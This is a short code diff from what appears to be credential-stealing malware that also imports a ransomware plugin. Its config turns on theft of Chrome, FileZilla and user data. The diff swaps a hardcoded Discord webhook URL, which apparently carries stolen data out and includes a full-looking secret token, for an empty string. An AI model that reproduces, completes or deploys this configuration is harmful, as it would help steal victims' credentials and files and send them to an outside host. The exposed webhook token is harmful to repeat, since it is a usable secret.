@@ -15,7 +15,7 @@ from plugins.ransomware import Ransomware
 from plugins.cleanup import CleanUp
 
 CONFIG = {
-    "webhook" : "https://ptb.discord.com/api/webhooks/896284146362622023/YiI6nNvCJHOIET-UBPwF_qSsxprH8VM2Xs9RN9d0VzPj1Lal7i7cFupKlAEIub7g-rqT",
+    "webhook" : "",
     "chrome" : True,
     "filezilla":True,
     "userdata":True,
